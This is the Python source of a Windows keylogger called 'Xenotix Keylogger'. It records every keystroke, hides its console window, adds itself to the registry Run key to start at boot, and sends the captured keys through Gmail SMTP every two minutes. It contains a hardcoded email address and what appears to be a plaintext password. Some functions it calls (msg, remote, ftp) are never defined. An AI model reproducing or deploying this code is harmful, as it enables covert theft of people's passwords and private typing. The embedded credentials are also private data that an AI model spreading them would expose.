'''
MINIMUM REQUIREMENTS
===================
Python 2.7: http://www.python.org/getit/
pyHook Module: http://sourceforge.net/projects/pyhook/
pyrhoncom Module: http://sourceforge.net/projects/pywin32/

pyHook Module - 
Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/
'''
try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)
x=''
data=''
count=0

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)

#Local Keylogger
def local():
    global data
    if len(data)>100:
        fp=open("keylogs.txt","a")
        fp.write(data)
        fp.close()
        data=''
    return True

#Email Logs
class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global data
            if len(data)>100:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com" #Specify Server Here
                PORT = 587 #Specify Port Here
                USER="oscarmateo1997@gmail.com"#Specify Username Here 
                PASS="viviteamomucho"#Specify Password Here
                FROM = USER#From address is taken from username
                TO = ["oscarmateo1997@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
                SUBJECT = "Keylogger data: "+str(ts)
                MESSAGE = data
                message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    data=''
                    server.quit()
                except Exception as e:
                    print e
            self.event.wait(120)


def main():
    global x
    if len(sys.argv)==1:
        msg()
        exit(0)
    else:
        if len(sys.argv)>2:
            if sys.argv[2]=="startup":
                addStartup() 
            else:
                msg()
                exit(0)
        if sys.argv[1]=="local":
            x=1
            hide()
        elif sys.argv[1]=="email":
            hide()
            email=TimerClass()
            email.start()
        else:
            msg()
            exit(0)
    return True

if __name__ == '__main__':
    main()

def keypressed(event):
    global x,data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys 
    if x==1:  
        local()
    elif x==2:
        remote()
    elif x==4:
        ftp()

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
